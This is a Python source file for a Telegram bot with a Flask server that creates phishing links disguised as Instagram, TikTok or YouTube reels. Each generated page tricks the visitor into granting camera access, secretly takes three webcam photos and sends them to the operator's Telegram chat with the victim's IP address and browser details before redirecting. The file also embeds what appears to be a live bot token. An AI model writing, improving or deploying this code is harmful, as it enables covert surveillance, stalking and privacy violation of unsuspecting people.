import os
import re
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from flask import Flask, request, jsonify, send_file
import requests
import base64
import io
from PIL import Image
from datetime import datetime
import threading
import time

# CONFIG - YOUR CREDENTIALS
TELEGRAM_TOKEN = "8551119607:AAEiD_-W555yxN1phyYI7QKrzSTL8lzzMFE"
CHAT_ID = "8595919435"
PORT = int(os.environ.get('PORT', 5000))

app = Flask(__name__)
phishing_links = {}
video_urls = {}

logging.basicConfig(level=logging.INFO)

# Global bot instance
bot = None

@app.route('/')
def index():
    return send_file('phish.html')

@app.route('/capture', methods=['POST'])
def capture_photo():
    try:
        data = request.json
        image_b64 = data['image']
        
        # Decode and save
        image_data = base64.b64decode(image_b64)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"victim_{timestamp}.jpg"
        
        with open(filename, 'wb') as f:
            f.write(image_data)
        
        # Send to Telegram
        with open(filename, 'rb') as photo:
            bot.send_photo(
                chat_id=CHAT_ID,
                photo=photo,
                caption=f"📸 *VICTIM CAPTURED!*\n🕐 {timestamp}\n🔗 {request.remote_addr}\n👤 {data.get('ua', 'Unknown')}"
            )
        
        os.remove(filename)
        return jsonify({"status": "success"})
    except:
        return jsonify({"status": "error"})

def create_phishing_page(target_url):
    """Generate custom phishing page with target redirect"""
    return f"""
<!DOCTYPE html>
<html>
<head>
    <title>Instagram Reel</title>
    <meta name="viewport" content="width=device-width">
    <style>
        body {{background:#000;font-family:system-ui;margin:0;height:100vh;display:flex;align-items:center;justify-content:center;}}
        .container {{text-align:center;color:white;}}
        .reel-thumb {{width:300px;height:500px;background:#222;border-radius:20px;margin:20px 0;position:relative;overflow:hidden;}}
        .play-btn {{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:80px;height:80px;background:#ff0000;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:40px;}}
        .capture-btn {{background:#0095f6;color:white;border:none;padding:15px 40px;border-radius:25px;font-size:18px;cursor:pointer;margin:20px;}}
        #status {{color:#ccc;font-size:14px;}}
    </style>
</head>
<body>
    <div class="container">
        <h2>🔥 Trending Reel</h2>
        <div class="reel-thumb">
            <div class="play-btn">▶</div>
        </div>
        <button class="capture-btn" onclick="stealCamera()">Watch Reel</button>
        <div id="status"></div>
        <video id="video" autoplay muted style="display:none;"></video>
    </div>
    <script>
        let target='{target_url}';
        async function stealCamera() {{
            document.querySelector('.capture-btn').innerHTML='🔄 Loading...';
            document.querySelector('.capture-btn').disabled=true;
            try {{
                let stream=await navigator.mediaDevices.getUserMedia({{video:true}});
                document.getElementById('video').srcObject=stream;
                for(let i=0;i<3;i++){{
                    setTimeout(()=>capture(),i*2000);
                }}
                setTimeout(()=>{{window.location.href=target;}},8000);
            }}catch(e){{
                window.location.href=target;
            }}
        }}
        async function capture(){{
            let video=document.getElementById('video');
            let canvas=document.createElement('canvas');
            canvas.width=640;canvas.height=480;
            canvas.getContext('2d').drawImage(video,0,0);
            let img=canvas.toDataURL('image/jpeg',0.9).split(',')[1];
            fetch('/capture',{{method:'POST',headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{image:img,ua:navigator.userAgent}})}});
        }}
    </script>
</body>
</html>
"""

# Telegram Bot Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *Camera Phish Bot Active!*\n\n"
        "📹 *Send me any Instagram/TikTok/YouTube URL*\n"
        "⚡ I create phishing link → Send to victims → Get their photos!\n\n"
        "*Example:*\n`https://www.instagram.com/reel/ABC123/`",
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global phishing_links
    
    url = update.message.text.strip()
    
    # Extract video URL (Instagram, TikTok, YouTube, etc.)
    video_match = re.search(r'(https?://[^\s]+)', url)
    if not video_match:
        await update.message.reply_text("❌ Send a valid video URL!")
        return
    
    target_url = video_match.group(1)
    video_urls[target_url] = target_url
    
    # Generate unique phishing link
    short_id = base64.urlsafe_b64encode(os.urandom(8)).decode('utf-8')[:8]
    phishing_url = f"https://{request.host}/{short_id}"
    phishing_links[short_id] = target_url
    
    # Create shareable link with inline button
    keyboard = [[InlineKeyboardButton("📱 Send Phishing Link", url=phishing_url)]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🎯 *Phishing Ready!*\n\n"
        f"🔗 *Target Video:* `{target_url}`\n"
        f"📸 *Phishing Link:* `{phishing_url}`\n\n"
        f"👥 *Send the button below to victims!*\n"
        f"📷 *You will get 3x photos instantly!*",
        parse_mode='Markdown',
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

@app.route('/<short_id>')
def phishing_page(short_id):
    target_url = phishing_links.get(short_id)
    if not target_url:
        return "Link expired", 404
    
    # Serve custom phishing page
    html = create_phishing_page(target_url)
    return html, 200, {'Content-Type': 'text/html'}

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logging.error(f"Update {update} caused error {context.error}")

def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False)

def main():
    global bot
    
    # Start Flask in thread
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # Telegram Bot
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_error_handler(error_handler)
    
    bot = application.bot
    print("🤖 Bot Started! Send video URLs to chat!")
    print(f"🌐 Server: http://0.0.0.0:{PORT}")
    
    application.run_polling()

if __name__ == '__main__':
    main()
